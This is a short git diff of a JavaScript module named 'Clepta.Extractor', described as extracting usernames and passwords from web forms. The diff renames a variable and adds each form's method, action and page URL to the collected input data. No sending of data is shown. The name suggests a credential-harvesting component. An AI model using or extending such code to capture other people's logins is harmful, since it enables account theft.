@@ -3,7 +3,7 @@ window.Clepta = window.Clepta || {};
 
 /**
  * Extractor
- * 
+ *
  * The extractor's job is to extract usernames and passwords from forms.
  */
 Clepta.Extractor = function (forms) {
@@ -34,10 +34,10 @@ Clepta.Extractor = function (forms) {
     return _.map(this.forms, function (form) {
       // Get all form inputs from the context's form
       var formInputs = form.querySelectorAll('input'),
-          data = [];
+          inputData = [];
 
       _.each(formInputs, function (input) {
-        data.push({
+        inputData.push({
           id: input.id || null,
           name: input.name || null,
           type: input.type || 'text',
@@ -47,7 +47,14 @@ Clepta.Extractor = function (forms) {
         });
       });
 
-      return data;
+      return {
+        info: {
+          method: (form.method || 'GET').toUpperCase(),
+          action: (form.action || window.location.href),
+          page: window.location.href
+        },
+        inputs: inputData
+      };
     });
   };
 };
